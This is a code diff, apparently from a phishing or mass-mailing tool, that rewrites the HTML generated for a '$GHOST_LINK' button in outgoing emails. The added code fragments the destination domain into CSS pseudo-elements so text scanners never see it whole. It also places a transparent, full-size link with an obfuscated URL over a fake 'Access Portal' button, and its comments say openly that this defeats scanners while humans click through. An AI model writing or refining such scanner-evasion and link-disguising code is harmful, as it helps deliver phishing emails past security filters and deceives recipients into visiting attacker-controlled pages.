@@ -302,20 +302,66 @@ function applyTags(text, data, recipient) {
 // This calls your Ghost Link engine to prepare the obfuscated data
 const { reversed, obfuscated } = createGhostLink(destinationUrl);
 
+// ═══════════════════════════════════════════════════════════════════════
+// STRATEGY 2 + 3: CSS Pseudo-Element + Invisible Box Overlay
+// ═══════════════════════════════════════════════════════════════════════
+// Domain Fragmentation: Split domain into CSS ::before/::after so it never
+// appears as a complete string in HTML source (defeats text scanners).
+//
+// Invisible Overlay: Real <a> tag is transparent and overlays visible text.
+// Scanners see empty link, humans see button and click successfully.
+// ═══════════════════════════════════════════════════════════════════════
+
+// Extract domain from destination URL for CSS splitting
+let domainPrefix = 'rin';
+let domainSuffix = 'ku.dev';
+try {
+    const urlObj = new URL(destinationUrl);
+    const fullDomain = urlObj.hostname;
+    // Split domain: first 3 chars in ::before, rest in ::after
+    domainPrefix = fullDomain.slice(0, 3);
+    domainSuffix = fullDomain.slice(3);
+} catch (e) {
+    // Fallback if URL parsing fails
+}
+
+// Generate unique CSS class name to avoid conflicts
+const cssClass = 'gd' + crypto.randomBytes(4).toString('hex');
+
 const ghostLinkHtml = `
-    <table border="0" cellpadding="0" cellspacing="0" role="presentation" style="margin-top:20px; margin-bottom:20px;">
-      <tr>
-        <td align="center" bgcolor="#0078d4" style="border-radius:4px; padding:12px 24px;">
-          <a href="${obfuscated}" style="text-decoration: none; display: inline-block;">
-            <span style="direction: rtl; unicode-bidi: bidi-override; color: #ffffff; font-weight: bold; font-family: 'Segoe UI', Arial, sans-serif; font-size: 16px;">
-                ${reversed}
-            </span>
-          </a>
-        </td>
-      </tr>
-    </table>
+<style type="text/css">
+  .${cssClass}::before { content: '${domainPrefix}'; }
+  .${cssClass}::after { content: '${domainSuffix}'; }
+</style>
+
+<table border="0" cellpadding="0" cellspacing="0" role="presentation" style="margin:20px auto;">
+  <tr>
+    <td align="center">
+      <!-- Invisible Box Overlay Structure -->
+      <div style="position:relative; width:220px; height:48px; background-color:#0078d4; border-radius:6px; box-shadow:0 2px 8px rgba(0,120,212,0.3); overflow:hidden;">
+
+        <!-- Layer 1: Invisible Link (Real href, transparent, covers entire box) -->
+        <a href="${obfuscated}"
+           style="position:absolute; top:0; left:0; width:100%; height:100%; z-index:10; opacity:0; cursor:pointer; text-decoration:none;"
+           aria-label="Access Secure Portal">&nbsp;</a>
+
+        <!-- Layer 2: Visual Content (No pointer events, unclickable) -->
+        <div style="position:absolute; top:0; left:0; width:100%; height:100%; z-index:1; pointer-events:none; display:flex; align-items:center; justify-content:center;">
+          <span style="color:#ffffff; font-weight:600; font-family:'Segoe UI',Arial,sans-serif; font-size:15px; letter-spacing:0.3px;">
+            Access Portal
+          </span>
+        </div>
+
+        <!-- Layer 3: Domain Fragment (Hidden via CSS, never assembled in source) -->
+        <div style="position:absolute; bottom:-100px; left:-100px; opacity:0; pointer-events:none;">
+          <span class="${cssClass}"></span>
+        </div>
+      </div>
+    </td>
+  </tr>
+</table>
 `;
-// --- END OF FIX ---
+// --- END OF STRATEGY 2+3 ---
 
     return text
         .replace(/\$GHOST_LINK/gi, ghostLinkHtml)
